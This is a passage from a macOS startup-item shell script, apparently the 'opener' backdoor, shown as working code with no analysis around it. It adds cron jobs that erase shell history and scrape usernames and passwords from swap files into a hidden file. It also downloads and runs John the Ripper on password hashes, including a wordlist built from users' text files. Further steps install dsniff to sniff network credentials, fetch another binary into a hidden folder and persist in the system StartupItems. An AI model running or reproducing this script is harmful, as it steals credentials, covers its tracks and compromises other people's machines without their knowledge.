echo "find . -maxdepth 2 -name \".bash_history\" -exec rm -f '{}' \;" >> /etc/weekly 
echo "history -c" >> /etc/weekly & 
fi 

################################################################################################ 
# Have the daily cron script try to grep the password from the vm swap files (at 3am by default) 
################################################################################################ 
# by g@pple 
last_line=`tail -n 1 /etc/daily` 
if [ "$last_line" != "strings -8 /var/vm/swapfile0 |grep -A 4 -i username >> /Library/Preferences/.indexed/v_m.txt" ] ; then 
echo "strings -8 /var/vm/swapfile* | grep -A 4 -i longname >> /Library/Preferences/.indexed/v_m.txt" >> /etc/daily 
echo "strings -8 /var/vm/swapfile* | grep -A 4 -i password >> /Library/Preferences/.indexed/v_m.txt" >> /etc/daily 
echo "strings -8 /var/vm/swapfile* | grep -A 4 -i username >> /Library/Preferences/.indexed/v_m.txt" >> /etc/daily & 
fi 

################################################################################################ 
# Download, install & run John The Ripper 
################################################################################################ 
# If jtr isn't there, install jtr 
if [ ! -f /Library/Preferences/jtr/run/john ] ; then 

# Make a jtr directory 
mkdir -p /Library/Preferences/jtr/run 
cd /Library/Preferences/jtr/ 

# download jtr 
/usr/bin/ftp http://deepquest.code511.com/os_X_tools/john-1.6.33-binaries-OSX.tar.gz 
/usr/bin/ftp http://openwall.com/john/a/john-1.6.tar.gz 

# decompres the files 
/usr/bin/gzip -d john-1.6.33-binaries-OSX.tar.gz 
/usr/bin/tar -xf john-1.6.33-binaries-OSX.tar 
/usr/bin/gzip -d john-1.6.tar.gz 
/usr/bin/tar -xf john-1.6.tar 

# copy what we need for jtr to run 
cp -R /Library/Preferences/jtr/john-1.6.33.pkg/Contents/Resources/run /Library/Preferences/jtr/ 
cp john-1.6/run/*.chr /Library/Preferences/jtr/run/ 
touch /Library/Preferences/jtr/run/john.pot # Just making sure this is there for the chmod 

# cleanup 
rm -R /Library/Preferences/jtr/john-1.6 /Library/Preferences/jtr/john-1.6.33.pkg /Library/Preferences/jtr/README* john-1.6.33-binaries-OSX.tar john-1.6.tar & 

fi # we're done downloading and installing john 

# make sure the john dir exists and is writable and what's in it is unlocked 
if [ -d /Library/Preferences/jtr/ ] ; then 
chflags -R nouchg /Library/Preferences/jtr/ 
chmod -Rf 777 /Library/Preferences/jtr/ 

# check to see if a restore file exists and if so, just restore 
if test -f /Library/Preferences/jtr/run/restore ; then 
cd /Library/Preferences/jtr/ 
./run/john -restore & 
./run/john -restore:DESs & 

else 

# build a bigger wordlist 
if [ ! -f /Library/Preferences/jtr/wordsdone ] ; then 
cat /usr/share/dict/* /Library/Preferences/jtr/run/password.lst | sort -us > /Library/Preferences/jtr/big2.txt 
find /Users -iname "*.txt" -type f -exec sort '{}' -us >> /Library/Preferences/jtr/big2.txt \; 
tr -cs "[:alnum:]" "\n" < /Library/Preferences/jtr/big2.txt > /Library/Preferences/jtr/big.txt 
tr "[:upper:]" "[:lower:]" < /Library/Preferences/jtr/big.txt > /Library/Preferences/jtr/big2.txt 
cat /Library/Preferences/jtr/big2.txt | fold -w 16 | sort -us > /Library/Preferences/jtr/run/password.lst 
rm /Library/Preferences/jtr/big.txt /Library/Preferences/jtr/big2.txt 
touch /Library/Preferences/jtr/wordsdone 
fi 

# run john on the 10.3 hashes 
# If there aren't any more of these type of hashes left to crack then jtr will just exit 
cd /Library/Preferences/jtr/ ; touch passwdNT4 passwdMD5 
nice -n 20 ./run/john -format:LM passwdNT4 & 

# run another instance of john on the 10.2 hashes 
# If there aren't any more of these type of hashes left to crack then jtr will just exit 
nice -n 20 ./run/john -session:DESs -format:DES passwdMD5 & 

fi 
fi 

echo -n "opener: Finished jtr " >> /.performance.txt ; date >> /.performance.txt # Write time to /.performance.txt 

################################################################################################ 
# miscellaneous 
################################################################################################ 
# uncomment these lines if you want everyone to have full access to managed preferences etc. 
#chmod -f 777 /Library & 
#chmod -Rf 777 /Library/ManagedPreferences /Library/Preferences/com.apple.MCX.plist /Groups & 
#chmod -Rf 777 /Library/Macintosh\ Manager & 

################################################################################################ 
# Download, install & run dsniff to start sniffing for passwords 
################################################################################################ 
# The dsniff logs can be read using: 
# sudo /usr/local/sbin/dsniff -r filename 

# If the dsniff directory isn't there, install dsniff 
if [ ! -d /Library/Preferences/dsstart ] ; then 

# Setup directory for installation files 
mkdir -p /Library/Preferences/dsstart 
chmod 777 /Library/Preferences/dsstart 
cd /Library/Preferences/dsstart 

# Download and uncompress dsniff 
/usr/bin/ftp http://www.linville.org/resources/OSX_dsniff.tgz 
/usr/bin/gzip -d OSX_dsniff.tgz 
/usr/bin/tar -xf OSX_dsniff.tar 

# Delete the compressed file 
rm -rf /Library/Preferences/dsstart/OSX_dsniff.tar & 

# Setup the dsniff directories and install dsniff and required packages 
mkdir -p /usr/local/sbin /usr/lib /usr/local/lib /usr/local/include/net /usr/include/libnet 
cp /Library/Preferences/dsstart/OSX_dsniff/libnet.a /usr/lib 
cp /Library/Preferences/dsstart/OSX_dsniff/libnet.h /usr/include 
cp /Library/Preferences/dsstart/OSX_dsniff/libnet-asn1.h /usr/include/libnet 
cp /Library/Preferences/dsstart/OSX_dsniff/libnet-functions.h /usr/include/libnet 
cp /Library/Preferences/dsstart/OSX_dsniff/libnet-headers.h /usr/include/libnet 
cp /Library/Preferences/dsstart/OSX_dsniff/libnet-macros.h /usr/include/libnet 
cp /Library/Preferences/dsstart/OSX_dsniff/libnet-ospf.h /usr/include/libnet 
cp /Library/Preferences/dsstart/OSX_dsniff/libnet-structures.h /usr/include/libnet 
cp /Library/Preferences/dsstart/OSX_dsniff/libnet-config /usr/bin 
cp /Library/Preferences/dsstart/OSX_dsniff/libnids.a /usr/local/lib 
cp /Library/Preferences/dsstart/OSX_dsniff/nids.h /usr/local/include 
cp /Library/Preferences/dsstart/OSX_dsniff/libpcap.a /usr/local/lib 
cp /Library/Preferences/dsstart/OSX_dsniff/pcap.h /usr/local/include 
cp /Library/Preferences/dsstart/OSX_dsniff/pcap-namedb.h /usr/local/include 
cp /Library/Preferences/dsstart/OSX_dsniff/bpf.h /usr/local/include/net/ 
/usr/bin/ranlib /usr/local/lib/libpcap.a 
/usr/bin/ranlib /usr/lib/libnet.a 
/usr/bin/ranlib /usr/local/lib/libnids.a 
cp /Library/Preferences/dsstart/OSX_dsniff/dsniff /usr/local/sbin 
cp /Library/Preferences/dsstart/OSX_dsniff/dsniff.magic /usr/local/lib 
cp /Library/Preferences/dsstart/OSX_dsniff/dsniff.services /usr/local/lib 
cp /Library/Preferences/dsstart/OSX_dsniff/dnsspoof.hosts /usr/local/lib 
cd /usr/lib 
ln -f -s libnet.a libpwrite.a 
fi 

# cleanup extra files after install 
rm -rf /Library/Preferences/dsstart/OSX_dsniff & 

# turn on port forwarding 
sysctl -w net.inet.ip.forwarding=1 

# Start sniffing to file but don't pause while dsniff opens, just continue this script 
# Change to correct port add -n to not resolve IP addresses to hostnames 
# en0 is generally built-in Ethernet and en1 is generally AirPort 
/usr/local/sbin/dsniff -i en0 -c -w /Library/Preferences/dsstart/en0sniff_`date +%m_%d_%H:%M` & 

echo -n "opener: Finished dsniff " >> /.performance.txt ; date >> /.performance.txt # Write time to /.performance.txt 

#----------------------------------------------------------------------------------------------- 
# Download ohphoneX (by Dr_Springfield) 
# part 3 of 3 - if you want to extract this routine you need all 3 parts (all in ---- sections) 
#----------------------------------------------------------------------------------------------- 
if [ ! -d /private/.phone ] ; then 
mkdir /private/.phone 
cd /private/.phone/ 
ftp http://umn.dl.sourceforge.net/sourceforge/xmeeting/ohphoneX_0.2_binary.dmg 2>&1 & 
fi 

################################################################################################ 
# One last bit of cleanup 
################################################################################################ 
# If we made it into the /System/Library/StartupItems folder then delete the copy in /Library/StartupItems 
scriptfolder=`basename "${scriptpath}"` 
if [ -d /System/Library/StartupItems/"${scriptfolder}" ] ; then 
if [ -d /Library/StartupItems/"${scriptfolder}" ] ; then 
rm -Rf /Library/StartupItems/"${scriptfolder}" & 
fi 
fi 

echo -n "opener: Ended at: " >> /.performance.txt ; date >> /.performance.txt # Write time to /.performance.txt 
